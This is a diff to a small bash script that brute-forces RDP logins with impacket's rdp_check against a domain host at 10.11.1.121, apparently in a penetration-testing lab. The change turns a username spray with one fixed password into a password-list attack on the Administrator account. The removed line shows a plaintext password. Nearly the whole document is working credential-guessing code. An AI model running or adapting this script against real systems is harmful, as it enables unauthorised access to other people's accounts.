@@ -1,11 +1,12 @@
 #!/bin/bash
 
 check="[-] Access Denied"
-
+login=Administrator
+list=your_list_of_passwords.txt
 
 while IFS= read -r line; do
 
-k=$(python3 ~/Tools/impacket/examples/rdp_check.py xor.com/$line:shantewhite@10.11.1.121 | grep Denied)
+k=$(impacket_rdp_check xor.com/$login:$line@10.11.1.121 | grep Denied)
 
 
 	if [ "$k" != "$check" ]; then
@@ -14,4 +15,4 @@ k=$(python3 ~/Tools/impacket/examples/rdp_check.py xor.com/$line:shantewhite@10.
 
 	fi
 
-done < xato-net-10-million-usernames.txt
+done < $list
